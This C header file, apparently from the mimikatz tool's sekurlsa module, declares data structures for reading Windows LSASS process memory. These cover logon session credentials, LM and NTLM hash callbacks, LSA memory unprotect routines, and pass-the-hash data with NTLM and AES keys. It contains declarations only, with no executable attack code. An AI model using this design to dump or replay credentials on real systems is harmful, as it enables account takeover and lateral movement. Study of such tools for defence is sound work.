/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "main.h"
#include "kull_m_memory.h"

typedef struct _KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION {
	KULL_M_MEMORY_ADDRESS DllBase;
	ULONG SizeOfImage;
	ULONG TimeDateStamp;
	PCUNICODE_STRING NameDontUseOutsideCallback;
} KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION, * PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION;

typedef struct _KUHL_M_SEKURLSA_LIB {
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION Informations;
	BOOL isPresent;
	BOOL isInit;
} KUHL_M_SEKURLSA_LIB, * PKUHL_M_SEKURLSA_LIB;

typedef struct _KUHL_M_SEKURLSA_OS_CONTEXT {
	DWORD MajorVersion;
	DWORD MinorVersion;
	DWORD BuildNumber;
} KUHL_M_SEKURLSA_OS_CONTEXT, *PKUHL_M_SEKURLSA_OS_CONTEXT;

typedef struct _KUHL_M_SEKURLSA_CONTEXT {
	PKULL_M_MEMORY_HANDLE hLsassMem;
	KUHL_M_SEKURLSA_OS_CONTEXT osContext;
} KUHL_M_SEKURLSA_CONTEXT, *PKUHL_M_SEKURLSA_CONTEXT;

typedef NTSTATUS (* PKUHL_M_SEKURLSA_ACQUIRE_KEYS_FUNCS) (PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
typedef NTSTATUS (* PKUHL_M_SEKURLSA_INIT) ();

typedef struct _KUHL_M_SEKURLSA_LOCAL_HELPER {
	PKUHL_M_SEKURLSA_INIT initLocalLib;
	PKUHL_M_SEKURLSA_INIT cleanLocalLib;
	PKUHL_M_SEKURLSA_ACQUIRE_KEYS_FUNCS AcquireKeys;
	const PLSA_PROTECT_MEMORY * pLsaProtectMemory;
	const PLSA_PROTECT_MEMORY * pLsaUnprotectMemory;
} KUHL_M_SEKURLSA_LOCAL_HELPER, *PKUHL_M_SEKURLSA_LOCAL_HELPER;

typedef struct _KIWI_BASIC_SECURITY_LOGON_SESSION_DATA {
	PKUHL_M_SEKURLSA_CONTEXT	cLsass;
	const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
	PLUID						LogonId;
	PLSA_UNICODE_STRING			UserName;
	PLSA_UNICODE_STRING			LogonDomain;
	ULONG						LogonType;
	ULONG						Session;
	PVOID						pCredentials;
	PSID						pSid;
	PVOID						pCredentialManager;
	FILETIME					LogonTime;
	PLSA_UNICODE_STRING			LogonServer;
} KIWI_BASIC_SECURITY_LOGON_SESSION_DATA, *PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA;

typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
typedef void (CALLBACK * PKUHL_M_SEKURLSA_ENUM_LOGONDATA) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
typedef BOOL (CALLBACK * PKUHL_M_SEKURLSA_ENUM) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

typedef struct _KUHL_M_SEKURLSA_PACKAGE {
	const wchar_t * Name;
	PKUHL_M_SEKURLSA_ENUM_LOGONDATA CredsForLUIDFunc;
	BOOL isValid;
	const wchar_t * ModuleName;
	KUHL_M_SEKURLSA_LIB Module;
} KUHL_M_SEKURLSA_PACKAGE, *PKUHL_M_SEKURLSA_PACKAGE;

typedef struct _SEKURLSA_PTH_DATA { 
	PLUID		LogonId;
	LPBYTE		NtlmHash;
	LPBYTE		Aes256Key;
	LPBYTE		Aes128Key;
	BOOL		isReplaceOk;
} SEKURLSA_PTH_DATA, *PSEKURLSA_PTH_DATA;